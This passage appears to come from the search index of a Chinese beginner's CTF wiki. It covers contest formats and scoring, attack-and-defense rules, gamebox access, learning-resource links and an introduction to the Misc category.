Writeup\u4e2d\u5219\u9700\u8981\u5305\u542b\u64cd\u4f5c\u73af\u5883\uff0c\u5b8c\u6574\u89e3\u9898\u8fc7\u7a0b\u4ee5\u53ca\u89e3\u9898\u4ee3\u7801\u3002</p> <p>\u9898\u76ee\u63d0\u4ea4\u4e4b\u540e\u4e3b\u529e\u65b9\u4f1a\u5bf9\u9898\u76ee\u548c\u89e3\u9898\u4ee3\u7801\u8fdb\u884c\u6d4b\u8bd5\uff0c\u5982\u679c\u671f\u95f4\u51fa\u73b0\u95ee\u9898\u5219\u9700\u8981\u8be5\u9898\u8d1f\u8d23\u4eba\u914d\u5408\u4ee5\u89e3\u51b3\u95ee\u9898\u3002\u6700\u7ec8\u653e\u5230\u6bd4\u8d5b\u5e73\u53f0\u4e0a\u3002</p>"},{"location":"introduction/mode/#_4","title":"\u89e3\u9898\u7ade\u6280","text":"<p>\u8fdb\u5165\u6bd4\u8d5b\u540e\uff0c\u5404\u652f\u961f\u4f0d\u53ef\u4ee5\u770b\u5230\u6240\u6709\u5176\u4ed6\u56e2\u961f\u51fa\u7684\u9898\u76ee\u5e76\u53d1\u8d77\u6311\u6218\uff0c\u4f46\u662f\u4e0d\u80fd\u89e3\u7b54\u672c\u961f\u51fa\u7684\u9898\u76ee\uff0c\u4e0d\u8bbe First Blood \u5956\u52b1\uff0c\u6839\u636e\u89e3\u9898\u79ef\u5206\u8fdb\u884c\u6392\u540d\u3002\u89e3\u9898\u79ef\u5206\u5360\u603b\u5206\u7684 60%\u3002</p>"},{"location":"introduction/mode/#_5","title":"\u5206\u4eab\u8ba8\u8bba","text":"<p>\u6bd4\u8d5b\u7ed3\u675f\u540e\uff0c\u961f\u4f0d\u4f11\u606f\uff0c\u5e76\u51c6\u5907\u5236\u4f5c\u5206\u4eab PPT\uff08\u4e5f\u53ef\u4ee5\u5728\u51fa\u9898\u9636\u6bb5\u51c6\u5907\u597d\uff09\u3002\u5206\u4eab\u4f1a\u65f6\uff0c\u5404\u961f\u6d3e 2 \u540d\u961f\u5458\u4e0a\u53f0\u5206\u4eab\u51fa\u9898\u89e3\u9898\u601d\u8def\uff0c\u5b66\u4e60\u8fc7\u7a0b\u4ee5\u53ca\u8003\u5bdf\u77e5\u8bc6\u70b9\u7b49\u3002\u5728\u6f14\u793a\u7ed3\u675f\u540e\u8fdb\u5165\u4e92\u52a8\u8ba8\u8bba\u73af\u8282\uff0c\u89e3\u8bf4\u4ee3\u8868\u9700\u8981\u56de\u7b54\u8bc4\u59d4\u548c\u5176\u4ed6\u9009\u624b\u63d0\u51fa\u7684\u95ee\u9898\u3002\u89e3\u8bf4\u6ca1\u6709\u592a\u591a\u7684\u65f6\u95f4\u9650\u5236\uff0c\u4f46\u662f\u65f6\u95f4\u7528\u91cf\u662f\u8bc4\u5206\u7684\u4e00\u4e2a\u6807\u51c6\u3002</p>"},{"location":"introduction/mode/#_6","title":"\u8ba1\u5206\u89c4\u5219","text":"<p>\u51fa\u9898\u79ef\u5206\uff08\u5360\u603b\u5206 30%\uff09\u6709 50% \u7531\u8bc4\u59d4\u6839\u636e\u9898\u76ee\u63d0\u4ea4\u7684\u8be6\u7ec6\u7a0b\u5ea6\uff0c\u5b8c\u6574\u5ea6\uff0c\u63d0\u4ea4\u65f6\u95f4\u7b49\u8fdb\u8bc4\u5206\uff0c\u53e6\u5916 50% \u5219\u6839\u636e\u6bd4\u8d5b\u7ed3\u675f\u540e\u7684\u6700\u7ec8\u89e3\u9898\u60c5\u51b5\u8fdb\u884c\u8bc4\u5206\u3002\u8ba1\u5206\u516c\u5f0f\u793a\u4f8b\uff1a Score = MaxScore -- | N -- Expect\uff3fN | \u3002N\u4ee3\u8868\u89e3\u51fa\u8be5\u9898\u7684\u961f\u4f0d\u6570\u91cf\uff0c\u800c Expect\uff3fN \u5219\u662f\u8fd9\u9053\u9898\u9884\u671f\u89e3\u51fa\u7684\u9898\u76ee\u6570\u91cf\u3002\u53ea\u6709\u5f53\u9898\u76ee\u96be\u5ea6\u9002\u4e2d\uff0c\u89e3\u9898\u961f\u4f0d\u6570\u91cf\u8d8a\u63a5\u8fd1\u9884\u671f\u6570\u91cf Expect\uff3fN\uff0c\u5219\u8fd9\u9053\u9898\u7684\u51fa\u9898\u961f\u4f0d\u5f97\u5230\u7684\u51fa\u9898\u79ef\u5206\u8d8a\u9ad8\u3002</p> <p>\u89e3\u9898\u79ef\u5206\uff08\u5360\u603b\u79ef\u5206 60%\uff09\u5728\u8ba1\u7b97\u65f6\u4e0d\u8003\u8651 First Blood \u5956\u52b1\u3002</p> <p>\u5206\u4eab\u79ef\u5206\uff08\u5360 10%\uff09\u7531\u8bc4\u59d4\u548c\u5176\u4ed6\u961f\u4f0d\u6839\u636e\u5176\u6280\u672f\u5206\u4eab\u5185\u5bb9\u8fdb\u884c\u8bc4\u5206\u5f97\u51fa\uff08\u8003\u8651\u5206\u4eab\u65f6\u95f4\u4ee5\u53ca\u5176\u4ed6\u9650\u5236\uff09\uff0c\u4f1a\u8ba1\u7b97\u5e73\u5747\u503c\u3002</p>"},{"location":"introduction/mode/#_7","title":"\u8d5b\u5236\u603b\u8bc4","text":"<p>\u8d5b\u5236\u4e2d\u5c06 Challenge \u7684\u51fa\u9898\u65b9\u4ea4\u7531\u53d7\u9080\u6218\u961f\uff0c\u8ba9\u6218\u961f\u80fd\u5c3d\u81ea\u5df1\u6240\u80fd\u4e92\u76f8\u51fa\u9898\uff0c\u6bd4\u8d5b\u96be\u5ea6\u548c\u8303\u56f4\u4e0d\u4f1a\u88ab\u4e3b\u529e\u65b9\u6c34\u5e73\u9650\u5236\uff0c\u540c\u65f6\u4e5f\u80fd\u63d0\u9ad8 Challenge \u7684\u8d28\u91cf\uff0c\u6bcf\u4e2a\u6218\u961f\u90fd\u80fd\u6709\u4e0d\u4e00\u6837\u7684\u4f53\u9a8c\u4e0e\u63d0\u5347\u3002\u5728\"\u5206\u4eab\"\u73af\u8282\uff0c\u5bf9\u672c\u961f\u9898\u76ee\u8fdb\u884c\u8bb2\u89e3\u7684\u540c\u65f6\u4e5f\u5728\u63d0\u9ad8\u81ea\u5df1\u7684\u80fd\u529b\u6c34\u5e73\uff0c\u5728\u8ba8\u8bba\u56de\u7b54\u7684\u8fc7\u7a0b\u66f4\u662f\u4e00\u79cd\u601d\u7ef4\u4e92\u52a8\u7684\u73af\u8282\u3002\u53ef\u4ee5\u5728\u8d5b\u540e\u7684\u5b66\u4e60\u603b\u7ed3\u4e2d\u80fd\u5f97\u5230\u66f4\u597d\u7684\u8ba4\u77e5\u3002</p>"},{"location":"introduction/mode/#-attack-defense","title":"\u653b\u9632\u6a21\u5f0f - Attack &amp; Defense","text":""},{"location":"introduction/mode/#_8","title":"\u6982\u8ff0","text":"<p>\u653b\u9632\u6a21\u5f0f\u5e38\u89c1\u4e8e\u7ebf\u4e0b\u51b3\u8d5b\u3002\u5728\u653b\u9632\u6a21\u5f0f\u4e2d\uff0c\u521d\u59cb\u65f6\u523b\uff0c\u6240\u6709\u53c2\u8d5b\u961f\u4f0d\u62e5\u6709\u76f8\u540c\u7684\u7cfb\u7edf\u73af\u5883\uff08\u5305\u542b\u82e5\u5e72\u670d\u52a1\uff0c\u53ef\u80fd\u4f4d\u4e8e\u4e0d\u540c\u7684\u673a\u5668\u4e0a\uff09\uff0c\u5e38\u79f0\u4e3a gamebox\uff0c\u53c2\u8d5b\u961f\u4f0d\u6316\u6398\u7f51\u7edc\u670d\u52a1\u6f0f\u6d1e\u5e76\u653b\u51fb\u5bf9\u624b\u670d\u52a1\u83b7\u53d6 flag \u6765\u5f97\u5206\uff0c\u4fee\u8865\u81ea\u8eab\u670d\u52a1\u6f0f\u6d1e\u8fdb\u884c\u9632\u5fa1\u4ece\u800c\u9632\u6b62\u6263\u5206\uff08\u4e00\u822c\u6765\u8bf4\u9632\u5fa1\u53ea\u80fd\u907f\u514d\u4e22\u5206\uff0c\u5f53\u7136\u6709\u7684\u6bd4\u8d5b\u5728\u9632\u5fa1\u4e0a\u53ef\u4ee5\u5f97\u5206\uff09\u3002</p> <p>\u653b\u9632\u6a21\u5f0f\u53ef\u4ee5\u5b9e\u65f6\u901a\u8fc7\u5f97\u5206\u53cd\u6620\u51fa\u6bd4\u8d5b\u60c5\u51b5\uff0c\u6700\u7ec8\u4e5f\u4ee5\u5f97\u5206\u76f4\u63a5\u5206\u51fa\u80dc\u8d1f\uff0c\u662f\u4e00\u79cd\u7ade\u4e89\u6fc0\u70c8\uff0c\u5177\u6709\u5f88\u5f3a\u89c2\u8d4f\u6027\u548c\u9ad8\u5ea6\u900f\u660e\u6027\u7684\u7f51\u7edc\u5b89\u5168\u8d5b\u5236\u3002\u5728\u8fd9\u79cd\u8d5b\u5236\u4e2d\uff0c\u4e0d\u4ec5\u4ec5\u662f\u6bd4\u53c2\u8d5b\u961f\u5458\u7684\u667a\u529b\u548c\u6280\u672f\uff0c\u4e5f\u6bd4\u4f53\u529b\uff08\u56e0\u4e3a\u6bd4\u8d5b\u4e00\u822c\u90fd\u4f1a\u6301\u7eed 48 \u5c0f\u65f6\uff09\uff0c\u540c\u65f6\u4e5f\u6bd4\u56e2\u961f\u4e4b\u95f4\u7684\u5206\u5de5\u914d\u5408\u4e0e\u5408\u4f5c\u3002</p> <p>\u4e00\u822c\u6bd4\u8d5b\u7684\u5177\u4f53\u73af\u5883\u4f1a\u5728\u5f00\u8d5b\u524d\u4e00\u5929\u6216\u8005\u5f53\u5929\u5f00\u8d5b\u524d\u534a\u5c0f\u65f6\u7531\u6bd4\u8d5b\u4e3b\u529e\u65b9\u7ed9\u51fa\uff08\u662f\u4e00\u4efd\u51e0\u9875\u7684\u5c0f\u6587\u6863\uff09\u3002\u5728\u8fd9\u4e00\u6bb5\u65f6\u95f4\u5185\uff0c\u4f60\u9700\u8981\u6839\u636e\u4e3b\u529e\u65b9\u63d0\u4f9b\u7684\u6587\u6863\u719f\u6089\u73af\u5883\u5e76\u505a\u597d\u9632\u5fa1\u3002</p> <p>\u5728\u6bd4\u8d5b\u5f00\u59cb\u524d\u534a\u5c0f\u65f6\uff0c\u8fd9\u534a\u5c0f\u65f6\u5185\u662f\u65e0\u6cd5\u8fdb\u884c\u653b\u51fb\u7684\uff0c\u5404\u652f\u961f\u4f0d\u90fd\u4f1a\u52a0\u7d27\u719f\u6089\u6bd4\u8d5b\u7f51\u7edc\u73af\u5883\uff0c\u5e76\u505a\u597d\u9632\u5fa1\u51c6\u5907\u3002\u81f3\u4e8e\u654c\u65b9 Gamebox \u7684 IP \u5730\u5740\uff0c\u5219\u9700\u8981\u9760\u4f60\u81ea\u5df1\u5728\u7ed9\u51fa\u7f51\u6bb5\u4e2d\u53d1\u73b0\u3002</p> <p>\u5982\u679c\u662f\u5206\u4e3a\u4e0a\u5348\u4e0b\u5348\u4e24\u573a\u653b\u9632\u8d5b\u7684\u8bdd\uff0c\u90a3\u4e48\u4e0a\u5348\u548c\u4e0b\u5348\u7684 Gamebox \u6f0f\u6d1e\u670d\u52a1\u4f1a\u66f4\u6362\uff08\u907f\u514d\u6bd4\u8d5b\u4e2d\u9014\u4f11\u606f\u65f6\u9009\u624b\u4ea4\u6d41\uff09\uff0c\u4f46\u7ba1\u7406\u65f6\u8981\u7528\u7684 IP \u5730\u5740\u4ec0\u4e48\u7684\u4e0d\u4f1a\u6539\u53d8\u3002\u4e5f\u5c31\u662f \u4e0b\u5348\u4f1a\u6362\u65b0\u9898 \u3002</p> <p>\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u4e3b\u529e\u65b9\u4f1a\u63d0\u4f9b\u7f51\u7ebf\uff0c\u4f46\u5e76\u4e0d\u4f1a\u63d0\u4f9b\u7f51\u7ebf\u8f6c\u63a5\u53e3\uff0c\u6240\u4ee5\u9700\u8981\u81ea\u5907\u3002</p>"},{"location":"introduction/mode/#_9","title":"\u57fa\u672c\u89c4\u5219","text":"<p>\u653b\u9632\u6a21\u5f0f\u4e00\u822c\u7684\u89c4\u5219\u5982\u4e0b</p> <ul> <li>\u6218\u961f\u521d\u59cb\u5206\u6570\u5747\u4e3a x \u5206</li> <li>\u6bd4\u8d5b\u4ee5 5/10 \u5206\u949f\u4e3a\u4e00\u4e2a\u56de\u5408\uff0c\u6bcf\u56de\u5408\u4e3b\u529e\u65b9\u4f1a\u66f4\u65b0\u5df2\u653e\u51fa\u670d\u52a1\u7684 Flag</li> <li>\u6bcf\u56de\u5408\u5185\uff0c\u4e00\u4e2a\u6218\u961f\u7684\u4e00\u4e2a\u670d\u52a1\u88ab\u6e17\u900f\u653b\u51fb\u6210\u529f\uff08\u88ab\u62ff Flag \u5e76\u63d0\u4ea4\uff09\uff0c\u5219\u6263\u9664\u4e00\u5b9a\u5206\u6570\uff0c\u653b\u51fb\u6210\u529f\u7684\u6218\u961f\u5e73\u5206\u8fd9\u4e9b\u5206\u6570\u3002</li> <li>\u6bcf\u56de\u5408\u5185\uff0c\u5982\u679c\u6218\u961f\u80fd\u591f\u7ef4\u62a4\u81ea\u5df1\u7684\u670d\u52a1\u6b63\u5e38\u8fd0\u884c\uff0c\u5219\u5206\u6570\u4e0d\u4f1a\u51cf\u5c11\uff08\u5982\u679c\u9632\u5fa1\u6210\u529f\u52a0\u5206\u5219\u4f1a\u52a0\u5206\uff09\uff1b</li> <li>\u5982\u679c\u4e00\u4e2a\u670d\u52a1\u5b95\u673a\u6216\u5f02\u5e38\u65e0\u6cd5\u901a\u8fc7\u6d4b\u8bd5\uff0c\u5219\u53ef\u80fd\u4f1a\u6263\u5206\uff0c\u670d\u52a1\u6b63\u5e38\u7684\u6218\u961f\u5e73\u5206\u8fd9\u4e9b\u5206\u3002\u5f80\u5f80\u670d\u52a1\u5f02\u5e38\u4f1a\u6263\u9664\u8f83\u591a\u7684\u5206\u6570\u3002</li> <li>\u5982\u679c\u8be5\u56de\u5408\u5185\u6240\u6709\u6218\u961f\u7684\u670d\u52a1\u90fd\u5f02\u5e38\uff0c\u5219\u8ba4\u4e3a\u662f\u4e0d\u53ef\u6297\u62d2\u56e0\u7d20\u9020\u6210\uff0c\u5206\u6570\u90fd\u4e0d\u51cf\u5c11\u3002</li> <li>\u6bcf\u56de\u5408\u5185\uff0c\u670d\u52a1\u5f02\u5e38\u548c\u88ab\u62ff Flag \u53ef\u4ee5\u540c\u65f6\u53d1\u751f\uff0c\u5373\u6218\u961f\u5728\u4e00\u4e2a\u56de\u5408\u5185\u5355\u4e2a\u670d\u52a1\u53ef\u80fd\u4f1a\u6263\u9664\u4e24\u8005\u53e0\u52a0\u7684\u5206\u6570\u3002</li> <li>\u7981\u6b62\u961f\u4f0d\u4f7f\u7528\u901a\u7528\u9632\u5fa1\u65b9\u6cd5</li> <li>\u8bf7\u53c2\u8d5b\u961f\u4f0d\u5728\u6bd4\u8d5b\u5f00\u59cb\u65f6\u5bf9\u6240\u6709\u670d\u52a1\u8fdb\u884c\u5907\u4efd\uff0c\u82e5\u56e0\u81ea\u8eab\u539f\u56e0\u5bfc\u81f4\u670d\u52a1\u6c38\u4e45\u635f\u574f\u6216\u4e22\u5931\uff0c\u65e0\u6cd5\u6062\u590d\uff0c\u4e3b\u529e\u65b9\u4e0d\u63d0\u4f9b\u91cd\u7f6e\u670d\u52a1</li> <li>\u7981\u6b62\u5bf9\u8d5b\u9898\u4ee5\u5916\u7684\u6bd4\u8d5b\u5e73\u53f0\u53d1\u8d77\u653b\u51fb\uff0c\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\u5728 gamebox \u63d0\u6743 root\u3001\u5229\u7528\u4e3b\u529e\u65b9\u5e73\u53f0\u6f0f\u6d1e\u7b49\uff0c\u8fdd\u89c4\u8005\u7acb\u523b\u88ab\u53d6\u6d88\u53c2\u8d5b\u8d44\u683c</li> <li>\u53c2\u8d5b\u961f\u4f0d\u5982\u679c\u53d1\u73b0\u5176\u4ed6\u961f\u4f0d\u5b58\u5728\u8fdd\u89c4\u884c\u4e3a\uff0c\u8bf7\u7acb\u523b\u4e3e\u62a5\uff0c\u6211\u4eec\u4f1a\u4e25\u683c\u5ba1\u6838\u5e76\u4f5c\u51fa\u76f8\u5e94\u5224\u7f5a\u3002</li> </ul>"},{"location":"introduction/mode/#_10","title":"\u7f51\u7edc\u73af\u5883","text":"<p>\u6587\u6863\u4e0a\u4e00\u822c\u90fd\u4f1a\u6709\u6bd4\u8d5b\u73af\u5883\u7684 \u7f51\u7edc\u62d3\u6251\u56fe \uff08\u5982\u4e0b\u56fe\uff09\uff0c\u6bcf\u652f\u961f\u4f0d\u4f1a\u7ef4\u62a4\u82e5\u5e72\u7684 Gamebox\uff08\u5df1\u65b9\u670d\u52a1\u5668\uff09 \uff0cGamebox \u4e0a\u90e8\u7f72\u6709\u5b58\u5728\u6f0f\u6d1e\u7684\u670d\u52a1\u3002</p> <p></p> <p>\u6587\u6863\u4e0a\u4f1a\u5305\u62ec\u9009\u624b\uff0c\u653b\u9632\u73af\u5883\uff0c\u4e3b\u529e\u65b9\u4e09\u8005\u7684\u73af\u5883\u3002</p> <p>\u9009\u624b\u9700\u8981\u5728\u4e2a\u4eba\u7535\u8111\u4e0a\u914d\u7f6e\u6216\u8005 DHCP \u81ea\u52a8\u83b7\u53d6</p> <ul> <li>IP \u5730\u5740</li> <li>\u7f51\u5173</li> <li>\u63a9\u7801DNS \u670d\u52a1\u5668\u5730\u5740</li> </ul> <p>\u653b\u9632\u73af\u5883</p> <ul> <li>Gamebox \u6240\u5904\u5730\u5740\uff0c\u5305\u62ec\u5df1\u65b9\u548c\u5176\u4ed6\u961f\u4f0d\u7684\u5730\u5740\u3002</li> <li>\u6bd4\u8d5b\u4e00\u822c\u4f1a\u63d0\u4f9b\u961f\u4f0d\u7684 id \u4e0e\u5bf9\u5e94 ip \u7684\u6620\u5c04\u8868\uff0c\u4ee5\u4fbf\u4e8e\u8ba9\u9009\u624b\u6307\u5b9a\u6070\u5f53\u7684\u653b\u9632\u7b56\u7565\u3002</li> </ul> <p>\u4e3b\u529e\u65b9\u73af\u5883</p> <ul> <li>\u6bd4\u8d5b\u7b54\u9898\u5e73\u53f0</li> <li>\u63d0\u4ea4 flag \u63a5\u53e3</li> <li>\u6d41\u91cf\u8bbf\u95ee\u63a5\u53e3</li> </ul>"},{"location":"introduction/mode/#gamebox","title":"\u8bbf\u95ee Gamebox","text":"<p>\u53c2\u8d5b\u6587\u6863\u4e2d\u4f1a\u7ed9\u51fa\u961f\u4f0d\u767b\u5f55 gamebox \u7684\u65b9\u5f0f\uff0c\u4e00\u822c\u6765\u8bf4\u5982\u4e0b</p> <ul> <li>\u7528\u6237\u540d\u4e3a ctf</li> <li>\u4e00\u822c\u4f1a\u901a\u8fc7 ssh \u767b\u5f55\uff0c\u767b\u5f55\u65b9\u5f0f\u4e3a\u5bc6\u7801\u6216\u8005\u79c1\u94a5\u3002</li> </ul> <p>\u81ea\u7136\uff0c\u5728\u767b\u5f55\u4e0a\u6218\u961f\u673a\u5668\u540e\u5e94\u8be5\u4fee\u6539\u6240\u6709\u7684\u9ed8\u8ba4\u5bc6\u7801\uff0c\u540c\u65f6\u4e0d\u5e94\u8be5\u8bbe\u7f6e\u5f31\u5bc6\u7801\u3002</p>"},{"location":"introduction/resources/","title":"CTF\u5165\u95e8\u5b66\u4e60\u8d44\u6599","text":""},{"location":"introduction/resources/#ctfmisc","title":"CTF\u4e86\u89e3+MISC\u5165\u95e8\u89c6\u9891\uff1a","text":"<p>https://www.bilibili.com/video/BV1eq4y1x71H?p=1&amp;vd_source=86a65fc21faa41995dd7993275846864 \u524d7\u96c6</p>"},{"location":"introduction/resources/#_1","title":"\u5237\u9898\u7f51\u7ad9\uff1a","text":"<ol> <li>https://www.nssctf.cn/problem</li> <li>https://buuoj.cn/challenges</li> <li>https://www.ichunqiu.com</li> </ol>"},{"location":"introduction/resources/#crypto","title":"Crypto\u65b9\u5411","text":"<p>\u300a\u73b0\u4ee3\u5bc6\u7801\u5b66\u57fa\u7840\u300b\uff08\u5927\u4e09\u9009\u4fee\u8bfe\uff09\uff0c\u4e86\u89e3\u57fa\u672c\u53e4\u5178\u5bc6\u7801\u548c\u73b0\u4ee3\u5bc6\u7801\u539f\u7406\uff0c\u638c\u63e1\u76f8\u5e94\u7684\u4ee3\u7801\u5b9e\u73b0\u3002 \u5927\u81f4\u9898\u578b\u89c1ctfwiki\u7684crypto\u90e8\u5206  \u5bc6\u7801\u5b66\u7b80\u4ecb - CTF Wiki (ctf-wiki.org)</p>"},{"location":"introduction/resources/#re","title":"RE\u65b9\u5411","text":"<p>RE\u548cPWN\u90fd\u8981\u6709x86\u6c47\u7f16\u57fa\u7840 \u6ca1\u6709\u7684\u8bdd\u5148\u5b66</p> <p>RE\u63a8\u8350\u5165\u95e8\u4e66\u300a\u9006\u5411\u5de5\u7a0b\u6838\u5fc3\u539f\u7406\u300b[\u97e9]\u674e\u627f\u8fdc</p>"},{"location":"introduction/resources/#pwn","title":"PWN\u65b9\u5411","text":"<p>\u5165\u95e8\u89c6\u9891\uff1a https://www.bilibili.com/video/BV1854y1y7Ro?p=1&amp;vd_source=86a65fc21faa41995dd7993275846864 \u5b66\u4e60\u7f51\u7ad9\uff1a</p> <ol> <li>https://guyinatuxedo.github.io/index.html \uff08\u63a8\u8350\uff0c\u8bb2\u7684\u6bd4\u8f83\u8be6\u7ec6\uff09</li> <li>https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/</li> <li>https://github.com/shellphish/how2heap</li> </ol>"},{"location":"introduction/resources/#web","title":"WEB\u65b9\u5411","text":"<pre><code>\u4e00\u4e9bblog\nhttps://www.leavesongs.com/sort/PENETRATION\nhttps://buuoj.cn/login\nhttp://www.anquanke.com/\nhttps://cyc1e183.github.io/\nhttps://www.seebug.org/\nhttps://www.cnblogs.com/hetianlab/\nhttps://doc.hitctf.cn/\nhttps://swas.console.aliyun.com/#/servers\nhttps://skysec.top/2020/08/23/2020-%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9BOnline-Writeup/\nhttps://devops.aliyun.com/organization/5f0e7630769820a3e817de42\nhttps://study.ichunqiu.com/student/train/index\nhttps://sqliteonline.com/\nhttps://owasp.org/\nhttps://www.mi1k7ea.com/\nhttps://book.hacktricks.xyz/\nhttps://xz.aliyun.com/\nhttps://codechina.csdn.net/mirrors/eastmountyxz/imageprocessing-python?utm_source=csdn_github_accelerator\nhttps://172.16.4.37/manage/Welcome/index\nhttp://14.21.43.250:8089/red/index/index.html\nhttps://mcfx.us/page/2/\nhttps://fanxiao.tech/posts/MIT-6S081-notes/#lecture-3-page-tables\nhttps://onlineunicodetools.com/generate-unicode-letters\nhttps://xuanxuanblingbling.github.io/\nhttps://www.ruanx.net/\nhttp://www.yongsheng.site/\nhttps://www.php.net/manual/zh/book.spl.php\nhttp://www.snowywar.top/\nhttps://r0yanx.com/\nhttp://shell-storm.org/repo/CTF/\nhttp://w4nder.top/index.php/2021/06/28/gkctf2021/\nhttps://susec.me/2022/03/13/phpok6-0-%E5%89%8D%E5%8F%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Egetshell/\nhttps://blog.z3ratu1.cn/HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0.html\nhttps://team-su.github.io/\nhttps://inhann.top/2022/03/26/hfctf2022_ezphp/\nhttps://www.wolai.com/8y9mP4KXpN6hLfNfM4y7VD\nhttps://command-not-found.com/\nhttp://blog.leanote.com/xp0int\nhttps://inhann.top/\nhttps://www.viewofthai.link/2022/06/05/%E5%9B%BD%E8%B5%9B-%E7%BA%BF%E4%B8%8A%E5%88%9D%E8%B5%9B-ciscn-2022-web-%E9%83%A8%E5%88%86wp/\nhttps://www.sqlsec.com/#indexCard\nhttps://qftm.github.io/\nhttps://www.viewofthai.link/\nhttps://blog.gzti.me/\nhttps://lazzzaro.github.io/2020/05/06/crypto-RSA/index.html\n</code></pre>"},{"location":"misc/introduction/","title":"Misc\u7b80\u4ecb","text":"<p>Misc \u662f\u82f1\u6587 Miscellaneous \u7684\u524d\u56db\u4e2a\u5b57\u6bcd\uff0c\u6742\u9879\u3001\u6df7\u5408\u4f53\u3001\u5927\u6742\u70e9\u7684\u610f\u601d\u3002</p> <p>Misc \u5728\u56fd\u5916\u7684\u6bd4\u8d5b\u4e2d\u5176\u5b9e\u53c8\u88ab\u5177\u4f53\u5212\u5206\u4e3a\u5404\u4e2a\u5c0f\u5757\uff0c\u6709</p> <ul> <li>Recon</li> <li>Forensic</li> <li>Stego</li> <li>Misc</li> <li>\u2026\u2026</li> </ul> <p>\u5728\u56fd\u5185\u7684\u6bd4\u8d5b\u4e2d\uff0c\u88ab\u7edf\u4e00\u5212\u5206\u5165 Misc \u9886\u57df\uff0c\u6709\u65f6 Crypto\uff08\u5c24\u5176\u662f\u53e4\u5178\u5bc6\u7801\uff09\u4e5f\u88ab\u5212\u5165\u5176\u4e2d\u3002</p> <p>\u5728 Misc \u8fd9\u4e00\u7ae0\u8282\u4e2d\uff0c\u5c06\u4ece\u4ee5\u4e0b\u51e0\u4e2a\u65b9\u9762\u4ecb\u7ecd\u8fd9\u4e00\u5757\u7684\u77e5\u8bc6\uff1a</p> <ul> <li> <p>Recon\uff08\u4fe1\u606f\u641c\u96c6\uff09</p> <p>\u4e3b\u8981\u4ecb\u7ecd\u4e00\u4e9b\u83b7\u53d6\u4fe1\u606f\u7684\u6e20\u9053\u548c\u4e00\u4e9b\u5229\u7528\u767e\u5ea6\u3001\u8c37\u6b4c\u7b49\u641c\u7d22\u5f15\u64ce\u7684\u6280\u5de7</p> </li> <li> <p>Encode\uff08\u7f16\u7801\u8f6c\u6362\uff09</p> <p>\u4e3b\u8981\u4ecb\u7ecd\u5728 CTF \u6bd4\u8d5b\u4e2d\u4e00\u4e9b\u5e38\u89c1\u7684\u7f16\u7801\u5f62\u5f0f\u4ee5\u53ca\u8f6c\u6362\u7684\u6280\u5de7\u548c\u5e38\u89c1\u65b9\u5f0f</p> </li> <li> <p>Forensic &amp;&amp; Stego\uff08\u6570\u5b57\u53d6\u8bc1 &amp;&amp; \u9690\u5199\u5206\u6790\uff09</p> <p>\u9690\u5199\u53d6\u8bc1\u662f Misc \u4e2d\u6700\u4e3a\u91cd\u8981\u7684\u4e00\u5757\uff0c\u5305\u62ec\u6587\u4ef6\u5206\u6790\u3001\u9690\u5199\u3001\u5185\u5b58\u955c\u50cf\u5206\u6790\u548c\u6d41\u91cf\u6293\u5305\u5206\u6790\u7b49\u7b49\uff0c\u6d89\u53ca\u5de7\u5999\u7684\u7f16\u7801\u3001\u9690\u85cf\u6570\u636e\u3001\u5c42\u5c42\u5d4c\u5957\u7684\u6587\u4ef6\u4e2d\u7684\u6587\u4ef6\uff0c\u7075\u6d3b\u5229\u7528\u641c\u7d22\u5f15\u64ce\u83b7\u53d6\u6240\u9700\u8981\u7684\u4fe1\u606f\u7b49\u7b49\u3002</p> </li> </ul> <p>CTF \u4e2d Misc \u4e0e\u73b0\u5b9e\u4e2d\u7684\u53d6\u8bc1\u4e0d\u540c\uff0c\u73b0\u5b9e\u4e2d\u7684\u53d6\u8bc1\u5f88\u5c11\u4f1a\u6d89\u53ca\u5de7\u5999\u7684\u7f16\u7801\u52a0\u5bc6\uff0c\u6570\u636e\u9690\u85cf\uff0c\u88ab\u5206\u6563\u5d4c\u5957\u5728\u5404\u5904\u7684\u6587\u4ef6\u5b57\u7b26\u4e32\uff0c\u6216\u662f\u5176\u4ed6\u8111\u6d1e\u7c7b\u7684 Challenge\u3002\u5f88\u591a\u65f6\u5019\u662f\u53bb\u7cbe\u5fc3\u6062\u590d\u4e00\u4e2a\u6b8b\u635f\u7684\u6587\u4ef6\uff0c\u6316\u6398\u635f\u574f\u786c\u76d8\u4e2d\u7684\u86db\u4e1d\u9a6c\u8ff9,\u6216\u8005\u4ece\u5185\u5b58\u955c\u50cf\u4e2d\u62bd\u53d6\u6709\u7528\u7684\u4fe1\u606f\u3002</p> <p>\u73b0\u5b9e\u7684\u53d6\u8bc1\u9700\u8981\u4ece\u4e1a\u8005\u80fd\u591f\u627e\u51fa\u95f4\u63a5\u7684\u6076\u610f\u884c\u4e3a\u8bc1\u636e\uff1a\u653b\u51fb\u8005\u653b\u51fb\u7cfb\u7edf\u7684\u75d5\u8ff9\uff0c\u6216\u662f\u5185\u90e8\u5a01\u80c1\u884c\u4e3a\u7684\u75d5\u8ff9\u3002\u5b9e\u9645\u5de5\u4f5c\u4e2d\u8ba1\u7b97\u673a\u53d6\u8bc1\u5927\u90e8\u5206\u662f\u4ece\u65e5\u5fd7\u3001\u5185\u5b58\u3001\u6587\u4ef6\u7cfb\u7edf\u4e2d\u627e\u51fa\u72af\u7f6a\u7ebf\u7d22\uff0c\u5e76\u627e\u51fa\u4e0e\u6587\u4ef6\u6216\u6587\u4ef6\u7cfb\u7edf\u4e2d\u6570\u636e\u7684\u5173\u7cfb\u3002\u800c\u6d41\u91cf\u53d6\u8bc1\u6bd4\u8d77\u5185\u5bb9\u6570\u636e\u7684\u5206\u6790\uff0c\u66f4\u6ce8\u91cd\u5143\u6570\u636e\u7684\u5206\u6790\uff0c\u4e5f\u5c31\u662f\u5f53\u524d\u4e0d\u540c\u7aef\u70b9\u95f4\u5e38\u7528 TLS \u52a0\u5bc6\u7684\u7f51\u7edc\u4f1a\u8bdd\u3002</p> <p>Misc \u662f\u5207\u5165 CTF 